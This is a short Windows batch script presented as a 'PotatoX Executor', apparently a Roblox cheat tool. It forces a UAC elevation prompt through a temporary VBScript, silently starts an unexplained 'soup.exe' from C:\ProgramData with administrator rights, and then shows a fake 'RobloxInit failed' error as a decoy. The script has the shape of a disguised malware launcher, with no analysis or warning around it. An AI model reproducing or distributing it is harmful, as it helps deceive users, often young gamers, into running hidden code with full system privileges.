@echo off
cd "C:\ProgramData"
title PotatoX Executor
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    goto :adminConfirmed
) ELSE (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)
:adminConfirmed
start soup.exe
msg *.* RobloxInit failed to complete (0x00000000)
exit
